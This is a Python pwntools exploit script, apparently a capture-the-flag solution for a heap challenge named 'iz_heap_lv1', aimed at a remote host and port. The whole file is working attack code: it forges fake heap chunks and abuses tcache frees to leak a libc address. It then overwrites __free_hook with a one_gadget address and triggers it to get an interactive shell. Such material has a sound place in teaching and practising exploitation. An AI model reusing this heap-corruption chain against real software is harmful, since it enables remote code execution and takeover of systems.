from pwn import *

context.log_level = 'debug'
#r = process('./iz_heap_lv1')
r = remote('165.22.110.249', 3333)
#gdb.attach(r)

libc = ELF('./libc.so.6')
malloc_hook_offset = libc.symbols['__malloc_hook']
free_hook_offset = libc.symbols['__free_hook']
one_gadget = [0x4f2c5,0x4f322,0x10a38c][1]

rr = lambda x: r.recvuntil(str(x))
ii = lambda x,y: r.sendlineafter(str(x),str(y))

def add(size, data):
    ii(': ', 1)
    ii(': ', size)
    ii(': ', data)

def edit(idx, data):
    ii(': ', 2)
    ii(': ', idx)
    ii(': ', data)

def delete(idx):
    ii(': ', 3)
    ii(': ', idx)

def show(mod, name):
    ii(': ', 4)
    ii(')', mod)
    if mod == 'Y':
        ii(': ', name)
    return (rr(': '), rr('\n'), rr('\n'))[2]

fake_chunk = p64(0x602120) + p64(0)*2 + p64(0x91) 
fake_chunk += p64(0) * 16 + p64(0) + p64(0x21)
fake_chunk += p64(0) * 2 + p64(0) + p64(0x21)
ii(': ', fake_chunk)

for i in range(7):
    add(127, 'a')
for i in range(7):
    delete(6-i)
delete(20)

leak = u64((show('Y', 'a'*(0x20-1)))[:-1].ljust(8, '\x00'))
libc_base = leak - 96 - 0x10 - malloc_hook_offset
libc_free_hook = libc_base + free_hook_offset
libc_1shot = libc_base + one_gadget

for i in range(5):
    add(127, 'a')

fake_chunk2 = p64(0x602120) + p64(0)*2 + p64(0x90) + p64(libc_free_hook)
show('Y',fake_chunk2)
delete(20)
show('Y',fake_chunk2)

add(127, 'a')
add(127, p64(libc_1shot))

delete(0)

r.interactive()
